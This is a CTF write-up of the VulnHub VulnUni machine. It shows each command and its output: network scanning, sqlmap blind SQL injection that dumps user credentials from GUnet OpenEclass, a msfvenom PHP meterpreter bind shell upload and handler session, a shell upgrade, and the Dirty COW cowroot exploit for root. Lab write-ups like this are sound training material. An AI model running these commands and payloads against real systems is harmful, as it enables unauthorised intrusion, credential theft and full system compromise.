---
description: 'By Tyler Butler, https://tylerbutler.io'
---

# VulnUni CTF Write-Up

## Overview

VulnUni is a CTF challenge hosted on [VulnHub](https://www.vulnhub.com/entry/vulnuni-101,439/) and created by [@](https://twitter.com/@emaragkos)[emaragkos](https://twitter.com/@emaragkos). It is a boot2root web application challenge that focuses on SQL injection vulnerabilities and linux privilege escalation. To solve this challenge, I used an unauthenticated blind SQL injection vulnerability, a php bind shell upload, and a linux kernel privilege escalation vulnerability. My workstation setup included VMware fusion and the 2020 release of Kali Linux for VMware which can be found on Offensive Securities [VM Image Download Page](https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/). One interesting aspect of this challenge is the use of a vulnerable E-learning platform from the Greek University Network GUnet.

## Getting Started

First, I launched both the VulnUni and Kali Linux virtual machines on the same local network. To identify the ip addresses of my local attack machine and the target, I ran an arp-scan.

```bash
root@kali$ arp-scan -I eth1 -l
```

```text
Interface: eth1, type: EN10MB, MAC: 00:50:56:3e:70:2d, IPv4: 192.168.8.131
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.8.1     00:50:56:c0:00:01       VMware, Inc.
192.168.8.132   00:0c:29:bc:43:d1       VMware, Inc.
192.168.8.254   00:50:56:e7:01:af       VMware, Inc.

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned in 1.991 seconds (128.58 hosts/sec). 3 responded
```

With the ip address handy, I started a couple quick nmap scans to kick off some basic enumeration to learn more about the target. I used one quick nmap scan to get an idea of what was open as well as a longer scan to check all ports.

```bash
root@kali$ nmap -sV -A -O 192.168.8.132
```

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-08 20:45 EDT
Nmap scan report for 192.168.8.132
Host is up (0.00077s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: VulnUni – We train the top Information Security Professionals
MAC Address: 00:0C:29:BC:43:D1 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 – 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.77 ms 192.168.8.132

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

## Website Enumeration

With 80 being the only port open, I launched some basic website enumeration tools including dirbuster and OWASP Zap. Dirbuster was used to brute-force directories and OWASP Zap was used to scan for common vulnerabilities. While these were running in the background, I started some manual website inspection to get familiar with the site.

```text
root@kali$ dirbuster
root@kali$ zaproxy
```

Zaproxy did not find any major vulnerabilities, but it did have several interesting listings for under directory browsing \(http://192.168.8.132/vulnuni-eclass/info/\). These directories were not found by the dirbuster brute force search due to the unique nature of the application.

![](https://i2.wp.com/www.babbagehall.org/wp-content/uploads/2020/05/Screen-Shot-2020-05-08-at-10.07.04-PM-1024x680.png?resize=768%2C510&ssl=1)

Navigating to the vulnuni subdirectory, some manual enumeration revealed the application was using version 1.7.2http://192.168.8.132/vulnuni-eclass/info/about.php

![](https://i0.wp.com/www.babbagehall.org/wp-content/uploads/2020/05/Screen-Shot-2020-05-08-at-10.18.22-PM-1024x685.png?resize=768%2C514&ssl=1)

A quick search through the [exploit-db database](https://www.exploit-db.com/) with the searchsploit command revealed two public exploits for the application, both created by the CTF author. Using the -m options, I downloaded both exploits into the vs code workspace to inspect the vulnerabilities and prepare to use them against the target

```bash
root@kali$ searchsploit GUnet 
```

```text
——————————————- —————————————-
 Exploit Title                             |  Path
                                           | (/usr/share/exploitdb/)
——————————————- —————————————-
GUnet OpenEclass 1.7.3 E-learning platform | exploits/php/webapps/48163.txt
GUnet OpenEclass E-learning platform 1.7.3 | exploits/php/webapps/48106.txt
——————————————- —————————————-
Shellcodes: No Result
root@kali$ searchsploit -m 48163
root@kali$ searchsploit -m 48106
```

## SQL Injection

The exploit 48106 revealed a ‘uname’ SQL Injection vulnerability fo the GUnet OpenEclass E-learning platform 1.7.3. To exploit the vulnerability, I first needed to capture a failed log-in request on http://192.168.8.132/vulnuni-eclass/ using burp-suite. I launched BurpSuite and configured my browser to handle http requests through a proxy at port 8080. I submitted a log in request using the username “admin” and the password “test”. BurpSuite captured the request, and I used the “send to repeater option” to save the request for editing.

![](https://i2.wp.com/www.babbagehall.org/wp-content/uploads/2020/05/Screen-Shot-2020-05-07-at-11.56.50-PM-1024x697.png?resize=768%2C523&ssl=1)

At this point, I encountered a small hiccup. Whenever http requests were sent to the vulnuni web application, the hostname was being resolved as VulnUni.local instead of http://192.168.8.132. This caused the http request to fail. To get around this issue, I needed to manually edit the burp-suite login capture to the ip address instead of the resolved hostname. Next, the exploit instructed me to download the intercepted http request as a file \(eclasstestlogin\) and load into SQL map with the following command.

```text
root@kali$ sqlmap -r eclasstestlogin –level=5 –risk=3 -v
```

![](https://i1.wp.com/www.babbagehall.org/wp-content/uploads/2020/05/Screen-Shot-2020-05-08-at-6.08.37-PM-1024x489.png?resize=768%2C367&ssl=1)

Using SQL map, I used several different flags to enumerate the vulnuni application. The final sqlmap command dumped the user table, which included usernames and passwords.

```text
root@kali$ sqlmap -r eclasstestlogin -v –current-db
root@kali$ sqlmap -r eclasstestlogin -v -D eclass –dump
root@kali$ sqlmap -r eclasstestlogin -v -D eclass -T user –dump
```

![](https://i0.wp.com/www.babbagehall.org/wp-content/uploads/2020/05/Screen-Shot-2020-05-08-at-10.25.25-PM-1024x532.png?resize=768%2C399&ssl=1)

Now that I obtained admin credentials from sqlmap, I logged into the application as the administrator. Once again, the http request was being resolved to vulnuni.local. To actually log into the application, I edited the raw request in burp-suite as shown below. After hitting send, I selected the Render” tab on the response, then right clicked and selected to open up in browser.

![](https://i1.wp.com/www.babbagehall.org/wp-content/uploads/2020/05/Screen-Shot-2020-05-08-at-11.40.59-PM-1024x572.png?resize=768%2C429&ssl=1)

Next, I navigated over to the other exploit identified earlier in the exploit-db. This exploit titled “GUnet OpenEclass 1.7.3 E-learning platform – ‘month’ SQL Injection” enables authenticated admins to upload reverse php shell files. To exploit this vulnerability, I used msfvenom to create a php meterpreter bind shell on port 4448.

```bash
root@kali$ msfvenom -p php/meterpreter/bind_tcp LHOST=192.168.8.130 LPORT=4448 R > bind-meterpreter.php
```

```text
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 1338 bytes
```

Before the exploit could be uploaded to the application, it needed to be zipped and compressed. Once zipped, I uploaded it to the vulnuni webserver.

```text
root@kali$ zip bind-meterpreter bind-meterpreter.php 
  adding: bind-meterpreter.php (deflated 62%)
```

## Target Infiltration

With the exploit ready, I started a metasploit session and opened a multi/handler to connect to the bind shell.

```text
root@kali$ msfconsole

msf5 > use multi/handler
msf5 exploit(multi/handler) > set LHOST 192.168.8.130
LHOST => 192.168.8.130
msf5 exploit(multi/handler) > set RHOST 192.168.8.132
RHOST => 192.168.8.132
msf5 exploit(multi/handler) > set LPORT 4448
LPORT => 4448
msf5 exploit(multi/handler) > set payload php/meterpreter/bind_tcp
payload => php/meterpreter/bind_tcp
```

I set the necessary LPORT, LHOST, RHOST, and payload options. Before I launched the handler, I browsed the payload on the target website to initiate the bind shell. Once the payload loaded, I ran the handler and received the shell.

```text
root@kali$ msf5 >

msf5 exploit(multi/handler) > run

[*] Started bind TCP handler against 192.168.8.132:4448
[*] Sending stage (38288 bytes) to 192.168.8.132
[*] Meterpreter session 1 opened (0.0.0.0:0 -> 192.168.8.132:4448) at 2020-05-12 00:43:47 -0400
```

![](https://i1.wp.com/www.babbagehall.org/wp-content/uploads/2020/05/Screen-Shot-2020-05-12-at-12.45.13-AM-1024x554.png?resize=768%2C416&ssl=1)

I spent some time running through meterpreter enumeration scripts to gather more details on the target. Once I gathered enough information, I dropped into a shell to run some linux privilege escalations scripts. Using the shell command, I dropped into a low interactive shell. To upgrade, I ran the following exports and used a simple python script to open up a bash shell.

```text
root@kali$ meterpreter > shell
Process 2181 created.
Channel 1 created.
export TERM=xterm
export SHELL=bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
python -c ‘import pty;pty.spawn(“/bin/bash”)’
www-data@vulnuni:/root@kali$
```

With a better shell, I did some manual navigating on the target and came across a flag in the vulnuni/home directory.

```text
www-data@vulnuni$ ls
ls
Desktop    Downloads  Pictures  Templates  examples.desktop
Documents  Music      Public    Videos     flag.txt
www-data@vulnuni:/home/vulnuniwww-data@vulnuni$ cat flag.txt
cat flag.txt
68fc668278d9b0d6c3b9dc100bee181e
```

Next, I opened up a webserver on my Kali linux machine to easily transfer some privilege escalation scripts to the target. I copied these scripts from my [redteam-apache-toolkit](https://github.com/tcbutler320/redteam-apache-toolkit) project to my webserver at /var/www/html . I used wget on the target to transfer the scripts into the /tmp folder. One of the privilege escalation/ enumeration scripts I ran was [BeRoot](https://github.com/AlessandroZ/BeRoot). The output showed that this target was vulnerable to the dirty cow linux kernel privilege escalation exploit.

![](https://i0.wp.com/www.babbagehall.org/wp-content/uploads/2020/05/Screen-Shot-2020-05-12-at-10.07.52-AM-1024x789.png?resize=768%2C592&ssl=1)

There are several dirty cow exploits available, each one uses a slightly different method of triggering the exploit. The GitHub [wiki pages](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs) includes a list of POC’s. I tried a few of these however running the exploit caused the target VM to crash, a common [problem](https://github.com/dirtycow/dirtycow.github.io/issues/25#issuecomment-255852675) experienced when using dirty cow. The best option I found was to use the SUID-based root exploit [cowroot](https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679). I copied the POC to my machine, compiled it with gcc, and then transferred it to the target with wget.

```text
root@kali$ root@kali:~/Desktop# gcc -pthread cowroot.c -o cowroot 
cowroot.c: In function ‘procselfmemThread’:
cowroot.c:98:17: warning: passing argument 2 of ‘lseek’ makes integer from pointer without a cast [-Wint-conversion]
   98 |         lseek(f,map,SEEK_SET);
      |                 ^~~
      |                 |
      |                 void *
In file included from cowroot.c:27:
/usr/include/unistd.h:334:41: note: expected ‘__off_t’ {aka ‘long int’} but argument is of type ‘void *’
  334 | extern __off_t lseek (int __fd, __off_t __offset, int __whence) __THROW;
      |                                 ~~~~~~~~^~~~~~~~
cowroot.c: In function ‘main’:
cowroot.c:135:5: warning: implicit declaration of function ‘asprintf’; did you mean ‘vsprintf’? [-Wimplicit-function-declaration]
  135 |     asprintf(&backup, “cp %s /tmp/bak”, suid_binary);
      |     ^~~~~~~~
      |     vsprintf
cowroot.c:139:5: warning: implicit declaration of function ‘fstat’ [-Wimplicit-function-declaration]
  139 |     fstat(f,&st);
      |     ^~~~~
```

With the exploit on the target machine, I made it executable with chmod and executed it. The dirty cow exploit upgraded my limited www-data shell to a full root shell. I quickly read the flag in the root directory with cat.

```text

root@kali$ msf >
meterpreter > shell
Process 2241 created.
Channel 0 created.
export TERM=xterm
export SHELL=bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
python -c ‘import pty;pty.spawn(“/bin/bash”)’
www-data@vulnuni:/var/www/vulnuni-eclass/courses/tmpUnzippingroot@kali$ ./cowroot
./cowroot
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
Size of binary: 42824
Racing, this may take a while..
/usr/bin/passwd overwritten
Popping root shell.
Don’t forget to restore /tmp/bak
thread stopped
thread stopped
root@vulnuni:/var/www/vulnuni-eclass/courses/tmpUnzipping# cat /root/flag.txt
cat /root/flag.txt
ff19f8d0692fe20f8af33a3bfa6635dd
root@vulnuni:/var/www/vulnuni-eclass/courses/tmpUnzipping# whoami
whoami
root
root@vulnuni:/var/www/vulnuni-eclass/courses/tmpUnzipping# id
id
uid=0(root) gid=33(www-data) groups=0(root),33(www-data)
root@vulnuni:/var/www/vulnuni-eclass/courses/tmpUnzipping#
```

![](https://i0.wp.com/www.babbagehall.org/wp-content/uploads/2020/05/Screen-Shot-2020-05-12-at-9.02.14-PM.png?resize=650%2C493&ssl=1)

Overall this was a good CTF challenge and taught me a little more about linux kernel privilege escalation exploits. Not all dirty cow exploits are the same, and many can cause virtual linux machines to crash. Additionally, the authors personal infosec blog is a good read and can be found at [https://emaragkos.gr](https://emaragkos.gr/).

